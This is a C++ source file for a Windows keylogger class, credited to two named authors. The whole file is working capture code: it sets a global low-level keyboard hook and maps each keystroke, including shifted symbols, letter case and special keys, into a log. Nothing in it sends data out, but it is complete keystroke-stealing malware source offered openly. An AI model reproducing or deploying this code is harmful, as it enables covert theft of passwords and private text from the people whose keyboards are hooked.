/**
  * @file KeyLogger.cpp
  * @author Daniel Amodio, Greg Siegel
  *
  */
  
#include "stdafx.h"
#include "KeyLogger.h"
#include <stdio.h>

// Static member initialization
KeyLogger *KeyLogger::objPointer = NULL;

KeyLogger::KeyLogger(DataLog &newDataLog)
{
     datalog = &newDataLog;
     objPointer = this;
}

KeyLogger::KeyLogger(LogTypeName newLogType)
{
     datalog = new DataLog(newLogType);
     
     datalog->log("\n\n------------------------------------------------------------------------");
     datalog->log("\n\t\t\t\tMyHook Session\t");
     datalog->log("------------------------------------------------------------------------\n");
     
     objPointer = this;
}

bool KeyLogger::isCapsLock()
{
     if ((GetKeyState(VK_CAPITAL) & 0x0001)!=0)
        return true;
     else
        return false;    
}

bool KeyLogger::logicalXOR(bool p, bool q)
{
     /* since there is no operator for logical xor in c++
        it must be written in once of the equivelant forms */
     return ((p || q) && !(p && q));
}

void KeyLogger::hookIt(void)
{
     // Retrieve the applications instance
    HINSTANCE appInstance = GetModuleHandle(NULL);

    // Set a global Windows Hook to capture keystrokes. Callback to static wrapper for non-static function
    SetWindowsHookEx( WH_KEYBOARD_LL, KeyLogger::LowLevelKeyboardProcWrapper, appInstance, 0 );

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) > 0)
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
}

LRESULT CALLBACK KeyLogger::LowLevelKeyboardProcWrapper( int nCode, WPARAM wParam, LPARAM lParam )
{
        return objPointer->LowLevelKeyboardProc(nCode, wParam, lParam);
}

LRESULT CALLBACK KeyLogger::LowLevelKeyboardProc( int nCode, WPARAM wParam, LPARAM lParam )
{
    // Declare pointer to the KBDLLHOOKSTRUCT
    KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *)lParam;

    switch (wParam)
    {
    case WM_KEYDOWN: // When the key has been pressed. Changed from WM_KEYUP to catch multiple strokes.
    {
        // Assign keyboard code to local variable
        DWORD vkCode = pKeyBoard->vkCode;

        if ((vkCode>=39)&&(vkCode<=64)) // Keys 0-9
        {
            if (GetAsyncKeyState(VK_SHIFT)) // Check if shift key is down (fairly accurate)
            {
                switch (vkCode) // 0x30-0x39 is 0-9 respectively
                {
                case 0x30:
                    datalog->log(")");
                    break;
                case 0x31:
                    datalog->log("!");
                    break;
                case 0x32:
                    datalog->log("@");
                    break;
                case 0x33:
                    datalog->log("#");
                    break;
                case 0x34:
                    datalog->log("$");
                    break;
                case 0x35:
                    datalog->log("%");
                    break;
                case 0x36:
                    datalog->log("^");
                    break;
                case 0x37:
                    datalog->log("&");
                    break;
                case 0x38:
                    datalog->log("*");
                    break;
                case 0x39:
                    datalog->log("(");
                    break;
                }
            }
            else // If shift key is not down
            {
                char val[5];
                sprintf(val,"%c",vkCode);
                datalog->log(val);
            }
        }
        else if ((vkCode>64)&&(vkCode<91)) // Keys a-z
        {
            /*
            The following is a complicated statement to check if the letters need to be switched to lowercase.
            Here is an explanation of why the exclusive or (XOR) must be used.
            
            Shift   Caps    LowerCase    UpperCase
            T       T       T            F
            T       F       F            T
            F       T       F            T
            F       F       T            F
            
            The above truth table shows what case letters are typed in,
            based on the state of the shift and caps lock key combinations.
            
            The UpperCase column is the same result as a logical XOR.
            However, since we're checking the opposite in the following if statement, we'll also include a NOT operator (!)
            Becuase, NOT(XOR) would give us the LowerCase column results.
            
            */
            if (!(logicalXOR(GetAsyncKeyState(VK_SHIFT),isCapsLock()))) // Check if letters should be lowercase
            {
                vkCode+=32; // Un-capitalize letters
            }
            char val[5];
            sprintf(val,"%c",vkCode);
            datalog->log(val);
        }
        else
        {
            switch (vkCode) // Check for other keys
            {
            case VK_SPACE:
                datalog->log(" ");
                break;
            case VK_RETURN:
                datalog->log("[ENTER]\n");
                break;
            case VK_BACK:
                datalog->log("[BKSP]");
                break;
            case VK_TAB:
                datalog->log("[TAB]");
                break;
            case VK_LCONTROL:
            case VK_RCONTROL:
                datalog->log("[CTRL]");
                break;
            case VK_LMENU:
            case VK_RMENU:
                datalog->log("[ALT]");
                break;
            case VK_CAPITAL:
                datalog->log("[CAPS]");
                break;
            case VK_ESCAPE:
                datalog->log("[ESC]");
                break;
            case VK_INSERT:
                datalog->log("[INSERT]");
                break;
            case VK_DELETE:
                datalog->log("[DEL]");
                break;
            case VK_NUMPAD0:
                datalog->log("0");
                break;
            case VK_NUMPAD1:
                datalog->log("1");
                break;
            case VK_NUMPAD2:
                datalog->log("2");
                break;
            case VK_NUMPAD3:
                datalog->log("3");
                break;
            case VK_NUMPAD4:
                datalog->log("4");
                break;
            case VK_NUMPAD5:
                datalog->log("5");
                break;
            case VK_NUMPAD6:
                datalog->log("6");
                break;
            case VK_NUMPAD7:
                datalog->log("7");
                break;
            case VK_NUMPAD8:
                datalog->log("8");
                break;
            case VK_NUMPAD9:
                datalog->log("9");
                break;
            case VK_OEM_2:
                if (GetAsyncKeyState(VK_SHIFT))
                    datalog->log("?");
                else
                    datalog->log("/");
                break;
            case VK_OEM_3:
                if (GetAsyncKeyState(VK_SHIFT))
                    datalog->log("~");
                else
                    datalog->log("`");
                break;
            case VK_OEM_4:
                 if(GetAsyncKeyState(VK_SHIFT))
                    datalog->log("{");
                 else
                    datalog->log("[");
                 break;
            case VK_OEM_5:
                 if(GetAsyncKeyState(VK_SHIFT))
                    datalog->log("|");
                 else
                    datalog->log("\\");
                 break;
            case VK_OEM_6:
                 if(GetAsyncKeyState(VK_SHIFT))
                    datalog->log("}");
                 else
                    datalog->log("]");
                 break;
            case VK_OEM_7:
                 if(GetAsyncKeyState(VK_SHIFT))
                    datalog->log("\"");
                 else
                    datalog->log("'");
                 break;
            case VK_LSHIFT:
            case VK_RSHIFT:
                // do nothing;
                break;
            case 0xBC:                //comma       
                 if(GetAsyncKeyState(VK_SHIFT))
                    datalog->log("<");
                 else
                    datalog->log(",");
                 break;
            case 0xBE:              //Period
                 if(GetAsyncKeyState(VK_SHIFT))
                    datalog->log(">");
                 else
                    datalog->log(".");
                 break;
            case 0xBA:              //Semi Colon same as VK_OEM_1
                 if(GetAsyncKeyState(VK_SHIFT))
                    datalog->log(":");
                 else
                    datalog->log(";");
                 break;
            case 0xBD:              //Minus
                 if(GetAsyncKeyState(VK_SHIFT))
                    datalog->log("_");
                 else
                    datalog->log("-");
                 break;
            case 0xBB:              //Equal
                 if(GetAsyncKeyState(VK_SHIFT))
                    datalog->log("+");
                 else
                    datalog->log("=");
                 break;
            default: // Catch all misc keys
                // fputc(vkCode,file); // Un-comment this to remove gibberish from the log file
                // printf("%c",vkCode); // Un-comment this line to debug and add support for more keys
                
                //  Use Getnametext instead of a lot of switch statements for system keys.
                            
                DWORD dwMsg = 1;
                dwMsg += pKeyBoard->scanCode << 16;
                dwMsg += pKeyBoard->flags << 24;

                char key[16];
                GetKeyNameTextA(dwMsg,key,15);
                
                datalog->log(key);                
            }
        }
    }
    default:
        return CallNextHookEx( NULL, nCode, wParam, lParam );
    }

    return 0;
}
